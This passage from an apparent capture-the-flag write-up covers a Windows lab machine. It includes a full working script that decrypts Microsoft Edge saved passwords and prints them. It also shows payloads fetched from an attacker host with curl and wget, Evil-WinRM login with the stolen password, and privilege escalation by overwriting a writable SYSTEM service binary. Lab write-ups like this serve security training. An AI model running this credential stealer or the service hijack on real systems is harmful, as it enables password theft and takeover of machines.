      "closed_without_unfreeze_previously_unfrozen": 0,
      "discard_without_unfreeze_never_unfrozen": 0,
      "discard_without_unfreeze_previously_unfrozen": 0
    },
    "tab_stats": {
      "frozen_daily": 0,
      "unfrozen_daily": 0
    }
<SNIP>
   "hash": "dd1IRBgqo/nsJcBZqhZGKNlI+Sw=",
        "signature": "u2mNBBt1wsur1rbaqTOHgWQDmcme+oOS8Pm2pTlulMo=",
        "timestamp": "1761159285"
      }
    ],
    "payload_counter": 3,
    "personalization_consent_change_time": "13358113894647954",
    "pseudo_low_entropy_source": 436,
    "session_id": 5,
    "stability": {
      "browser_last_live_timestamp": "13405632885090870",
      "exited_cleanly": true,
      "saved_system_profile": "CP6Ay7EGEhAxMjQuMC4yNDc4LjgwLTY0GAAiBWVuLVVTKhgKCldpbmRvd3MgTlQSCjEwLjAuMTc3NjMyhQIKBng4Nl82NBC3FxiAgNSV/v8fIhdWTXdhc.:"
<SNIP>
"saved_system_profile_hash": "48FC71E0C234CEDF5DE4F8091C04EFB81309F6D9",
      "stats_buildtime": "1714602110",
      "stats_version": "124.0.2478.80-64",
      "system_crash_count": 0
    },
    "unsent_log_metadata": {
      "initial_logs": {
        "sent_samples_count": 0,
        "unsent_persisted_size_in_kb": 0,
        "unsent_samples_count": 0
      },
      "ongoing_logs": {
        "sent_samples_count": 0,
        "unsent_persisted_size_in_kb": 31,
        "unsent_samples_count": 47830
      }
    }
  },
  "variations": {
    "state_reset": {
      "timestamp": "13405555837662070"
    }
  },
  "variations_failed_to_fetch_seed_streak": 27,
  "variations_google_groups": {
    "Default": []
  },
  "variations_limited_entropy_synthetic_trial_seed_v2": "20",
  "was": {
    "restarted": false
  }
}
```

Steps:
- **Find the `os_crypt.encrypted_key`** and decode the Base64 value.
- **Use the decoded encryption key** to decrypt data from the **Login Data** or **Web Data** databases.

```bash
"encrypted_key": "RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAABzr42Q+SDgR78a6A6x6z+EEAAAAB4AAABNAGkAYwByAG8AcwBvAGYAdAAgAEUAZABnAGUAAAAQZgAAAAEAACAAAABZqUTKi+3PgIqd3Qa3HRY2/JCmSDJLECa+TMtiB0cTPAAAAAAOgAAAAAIAACAAAAB0hEH7C3oQN6ghOwRl2cHGV2G3/o/oobqZ3Zm0uQNUhjAAAAAWtJnWT3GsY2PXsMOl66xYaMIXJodfrvLK5HVzFOvcGuw1CJn8xvbLF0LLyaOLujdAAAAA+vRmKffc2JdtiXx3o7Pvxy5CiU8YAuklDgNkgE+eAFDiAhBb5ZWr7zp30+GtPk4qluAXDrum+QHtuygfoywpTw=="
```

Decode:

```python
└─$ base64 -d master_key > decoded_key
```

The key in `os_crypt['encrypted_key']` contains a `DPAPI` prefix in the first 5 bytes. These bytes need to be removed, leaving just the actual encryption key, which should be 32 bytes for AES-256.

Now we can use a full `python` script on the target system (check right libraries there):

```python
import os
import json
import base64
import shutil
import sqlite3
import win32crypt
from Crypto.Cipher import AES

# Paths
local_state_path = os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Local State")
login_data_path = os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\Login Data")

# Get encrypted key and decrypt it
with open(local_state_path, "r", encoding="utf-8") as f:
    local_state = json.load(f)
encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]  # Remove 'DPAPI' prefix
secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Copy database to avoid locking
shutil.copy2(login_data_path, "temp_login.db")
conn = sqlite3.connect("temp_login.db")
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

# Decrypt each password
for url, username, enc_password in cursor.fetchall():
    if len(enc_password) < 16:
        continue
    iv = enc_password[3:15]
    payload = enc_password[15:-16]
    cipher = AES.new(secret_key, AES.MODE_GCM, iv)
    try:
        password = cipher.decrypt(payload).decode()
        print(f"URL: {url}\nUsername: {username}\nPassword: {password}\n")
    except Exception as e:
        print(f"Failed to decrypt: {str(e)}")

conn.close()
os.remove("temp_login.db")
```

We `cURL` it on the system:

```bash
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

C:\Users\web\Documents>curl -O http://10.10.14.121/decryptor.py
```

Run it:

```powershell
C:\Users\web\Documents>py decryptor.py
py decryptor.py
Failed to decrypt: 'utf-8' codec can't decode byte 0xb2 in position 4: invalid start byte
URL: http://eloquia.htb/accounts/login/
Username: Olivia.KAT
Password: S3cureP@sswdIGu3ss

URL: https://eloquia.htb/
Username: test
Password: testtest1234!

URL: https://chatgpt.com/
Username: olivia.kat
Password: S3cureP@sswd3Openai
```

Use [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md) :

```bash
evil-winrm -i 10.10.11.99 -u 'Olivia.KAT' -p 'S3cureP@sswdIGu3ss'
```
## Olivia.KAT to Administrator: Fail2Ban Abuse

If we check Access Control Lists (ACLs) on the binary and its folder:

```powershell
*Evil-WinRM* PS C:\Users\Olivia.KAT\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

*Evil-WinRM* PS C:\Users\Olivia.KAT\Desktop> dir


    Directory: C:\Users\Olivia.KAT\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2024   1:53 PM           1558 Failure2Ban - Prototype - Shortcut.lnk
-a----         5/6/2024   2:00 PM        1331957 Logfile.PML
-a----        4/22/2024   7:02 AM            362 Todo.txt

*Evil-WinRM* PS C:\Users\Olivia.KAT\Desktop> icacls "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe"
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe ELOQUIA\Olivia.KAT:(I)(RX,W)                                                                               
                                                                                                   NT AUTHORITY\SYSTEM:(I)(F)                                                                                 
                                                                                                   BUILTIN\Administrators:(I)(F)
                                                                                                   BUILTIN\Users:(I)(RX)
                                                                                                   APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                                                   APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

**Binary Path:** `C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe`

The service runs as `NT AUTHORITY\SYSTEM`.

`Olivia.KAT` has **Write (W)** permissions on the service executable. This is a **Insecure Service Executable** vulnerability.

**Root Flag**

We create a simple C program that copies the root flag to our directory:

```c
#include <stdio.h>
#include <windows.h>

int main() {
    // Define source and destination paths
    const char *source = "C:\\Users\\Administrator\\Desktop\\root.txt";  // Path of root.txt
    const char *destination = "C:\\Users\\Olivia.KAT\\Documents\\root.txt";  // Destination path

    // Use Windows CopyFile function to copy the file
    if (CopyFile(source, destination, FALSE)) {
        printf("File copied successfully!\n");
    } else {
        printf("Error copying the file. Error code: %d\n", GetLastError());
    }

    return 0;
}
```

Compile it:

```rust
x86_64-w64-mingw32-gcc -O2 -s -o xpl.exe service.c
```

We use a PowerShell loop to attempt to overwrite the file until the file lock is released:

```bash
$svc = 'C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe'

while ($true) {
    try {
        $stream = [System.IO.File]::Open($svc, 'Open', 'Write')
        $stream.Close()
        Copy-Item 'C:\Users\Olivia.KAT\Downloads\new.exe' $svc -Force
        break
    } catch {
        Start-Sleep -Milliseconds 200
    }
}
```

Host a server and download the files:

```powershell
wget http://10.10.14.121/new.exe -o new.exe 
wget http://10.10.14.121/loop.ps1 -o loop.ps1 
```

Run the script and read the root flag:

```powershell
*Evil-WinRM* PS C:\Users\Olivia.KAT\Downloads> ./loop.ps1

*Evil-WinRM* PS C:\Users\Olivia.KAT\Downloads> ls


    Directory: C:\Users\Olivia.KAT\Downloads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/17/2025   6:22 AM            367 loop.ps1
-ar---       12/17/2025   4:36 AM             34 root.txt
-a----       12/17/2025   6:18 AM          41984 new.exe


*Evil-WinRM* PS C:\Users\Olivia.KAT\Downloads> cat root.txt
HTB{REDACTED_FLAG}
```

Pwned !!
### The “Intended” Path (Log Poisoning)

The service reads a configuration file (`Failure2Ban.exe.config`) to find a log file path. It then parses this log file for “FAILED” login attempts.

1. **Path Traversal:** The log file path in the config is not sanitized. We can point it to a file we control.
2. **Rule Injection:** When a ban is triggered, the service constructs a Firewall Rule using the IP address from the log.`// Vulnerable Code Logic instance.Rules.Add(new INetFwRule { Name = "Block IP " + ip, RemoteAddresses = ip // Injection point? });`
